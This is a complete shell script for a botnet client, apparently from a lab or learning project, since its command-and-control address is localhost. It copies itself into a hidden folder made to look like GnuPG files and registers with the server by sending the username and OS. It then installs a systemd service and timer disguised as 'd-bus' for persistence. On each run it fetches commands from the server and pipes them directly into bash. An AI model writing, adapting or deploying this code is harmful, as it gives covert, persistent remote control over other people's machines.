#!/bin/sh

cc_server=http://localhost:41450

#Gather basic system information
user=$(whoami)
operating_sys=$(uname)

hash_type=sha256sum
seed_dir=~/.gnupg/.seeds
script=./bash-client.sh

service_dest=~/.config/systemd/user
sys_service_dest=/etc/systemd/system
service=d-bus.service
root_service=root.d-bus.service
timer=d-bus.timer

function init_seed() {
    #Make installation directory and mascarade as GnuPG files
	mkdir -p $seed_dir
    #Create a file with random data to use as a means of identifying bot
	dd if=/dev/urandom of=$seed_dir/.seed_gnupg~ count=50 && sync
    #Copy this scrip into the installation folder
	cp $script $seed_dir/.seed_gnupg
}

function register() {
    #Calculate hash from the file with random data and use as identification
	hash_sum=$($hash_type $seed_dir/.seed_gnupg~ | egrep -o '^\S+')
    #Send information to the CC server in a POST request to do a first time registration
	curl -d "hash_type=$hash_type&hash_sum=$hash_sum&operating_sys=$operating_sys&user=$user" $cc_server/convey/register/
}

function init_systemd() {
    #If the user is root, configure as a system service
    if [ $(id -u) -eq 0 ]; then
        #Install systemd service
		cp $root_service $sys_service_dest/$service
        #Install and enable timer
		cp $timer $sys_service_dest/$timer
		systemctl enable --now $timer
	else
        #Same thing but installing service as a user service instead
		cp $service $service_dest/$service
		cp $timer $service_dest/$timer
		systemctl enable --user --now $timer
	fi
}

function run_cmd() {
    #Calculate hash to ensure integrity of installation
	hash_sum=$($hash_type $seed_dir/.seed_gnupg~ | egrep -o '.+\s')
    #Send hash and current IP address (for sake of updating info) in a POST request
    #CC server will return a command. This is then piped directly to bash and executed
	curl -sLd "hash_sum=$hash_sum" $cc_server/convey/cmd/ | bash
}


#If the random identification file does not exist then:
if [ ! -f $seed_dir/.seed_gnupg~ ]; then
	init_seed
	register
	init_systemd
#Otherwise, check in with the CC server for a command to run
else
	run_cmd
fi

